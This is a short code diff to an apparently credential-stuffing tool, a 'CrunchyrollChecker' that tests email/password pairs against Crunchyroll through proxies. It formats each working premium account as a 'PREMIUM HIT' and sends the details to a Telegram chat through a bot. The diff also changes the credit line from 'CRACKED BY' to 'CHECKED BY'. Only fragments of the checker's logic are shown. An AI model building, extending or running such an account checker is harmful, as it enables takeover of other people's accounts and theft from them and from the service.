@@ -69,7 +69,6 @@ class CrunchyrollChecker:
         return {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
 
     def check(self, email, password):
-        # Your original check logic (kept intact)
         try:
             device_id = str(uuid.uuid4())
             session = requests.Session()
@@ -186,7 +185,7 @@ EXPIRY: {result.get('expiry', 'N/A')}
 PLAN DURATION: {result.get('plan_duration', 'N/A')}
 ACTIVE: {result.get('active', 'N/A')}
 COUNTRY: {result.get('country', 'N/A')}
-CRACKED BY: @Baron
+CHECKED BY: @Cr_chker001_bot
 {'='*70}
 """
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
